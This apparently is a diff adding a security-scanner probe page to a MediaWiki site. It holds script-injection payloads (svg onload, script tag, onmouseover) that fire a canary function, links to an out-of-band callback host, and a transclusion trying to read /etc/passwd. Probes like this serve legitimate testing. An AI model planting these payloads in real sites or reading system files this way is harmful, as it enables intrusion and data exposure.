@@ -1,0 +1,9 @@
+== MediaWiki probe ==
+
+<svg onload="window.__forgeXssHit('FORGE_XSS_6f06474839e36a62dcaaaeaa956778ed')"></svg>
+<script>window.__forgeXssHit('FORGE_XSS_6f06474839e36a62dcaaaeaa956778ed')</script>
+<div onmouseover="window.__forgeXssHit('FORGE_XSS_6f06474839e36a62dcaaaeaa956778ed')">hover</div>
+
+[http://PEN-NZUY-4251-6754.dns.collabp-reg1.devops.aws.dev/mw-link link]
+[[File:http://PEN-NZUY-4251-6754.dns.collabp-reg1.devops.aws.dev/mw-image.png]]
+{{:/etc/passwd}}
